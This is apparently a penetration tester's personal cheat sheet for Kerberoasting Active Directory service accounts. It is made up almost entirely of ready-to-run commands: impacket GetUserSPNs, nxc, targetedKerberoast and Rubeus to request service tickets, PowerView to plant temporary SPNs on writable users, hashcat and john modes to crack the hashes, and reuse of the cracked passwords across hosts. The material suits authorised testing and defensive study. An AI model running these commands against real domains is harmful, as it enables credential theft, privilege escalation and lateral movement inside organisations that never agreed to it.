# Kerberoasting

## Before I start
sudo ntpdate <DCIP>
- [ ] KRB_AP_ERR_SKEW on any line below: the clock again, right before it
- [ ] Any domain credential will do: a password, or an NT hash with -hashes

## Find the roastable accounts
impacket-GetUserSPNs '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
- [ ] MemberOf: a service account in an admin group is the one to crack first
- [ ] PasswordLastSet years ago: a weak password, set by hand and never changed
- [ ] krbtgt and computer accounts have random passwords: not worth the time

## Request the tickets
impacket-GetUserSPNs '<Domain>/<Username>:<Password>' -dc-ip <DCIP> -request -outputfile kerberoast.txt
impacket-GetUserSPNs '<Domain>/<Username>' -hashes ':<Hash>' -dc-ip <DCIP> -request -outputfile kerberoast.txt
One account only:
impacket-GetUserSPNs '<Domain>/<Username>:<Password>' -dc-ip <DCIP> -request-user '<TargetUser>' -outputfile kerberoast.txt
The same through nxc:
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --kerberoasting kerberoast.txt

## Targeted, with GenericWrite or GenericAll over a user
At the pwn-broker prompt: tool install targetedkerberoast. It sets a temporary SPN on each user I can write, roasts it, and takes the SPN off again.
targetedKerberoast -d <Domain> -u '<Username>' -p '<Password>' --dc-ip <DCIP> -o targeted.txt
targetedKerberoast -d <Domain> -u '<Username>' -H ':<Hash>' --dc-ip <DCIP> -o targeted.txt
One user only:
targetedKerberoast -d <Domain> -u '<Username>' -p '<Password>' --dc-ip <DCIP> --request-user '<TargetUser>' -o targeted.txt
- [ ] It stopped part way: the user may keep the SPN, so check it with Get-DomainUser or BloodHound
- [ ] Shadow credentials give the hash with no cracking at all: :Pb acl-abuse

## From a Windows shell
Rubeus.exe from my own tools, into upload/ for serve. /nowrap keeps each hash on one line.
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap
.\Rubeus.exe kerberoast /user:<TargetUser> /outfile:kerberoast.txt /nowrap
Targeted, with PowerView loaded:
Set-DomainObject -Identity '<TargetUser>' -Set @{serviceprincipalname='cifs/pwn'}
.\Rubeus.exe kerberoast /user:<TargetUser> /outfile:targeted.txt /nowrap
Set-DomainObject -Identity '<TargetUser>' -Clear serviceprincipalname
- [ ] kerberoast.txt sent back to Kali with the line serve files gives

## Crack
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 targeted.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
- [ ] $krb5tgs$23$ is RC4, mode 13100
- [ ] $krb5tgs$17$ is AES128, mode 19600, and $krb5tgs$18$ is AES256, mode 19700: far slower
hashcat -m 13100 kerberoast.txt --show

## Next
nxc smb <DCIP> -u '<TargetUser>' -p 'THE-CRACKED-PASSWORD'
- [ ] The cracked password tried everywhere, and against other accounts: :Pb smb, where this credential works
- [ ] The service account marked Owned in BloodHound, and its paths read again
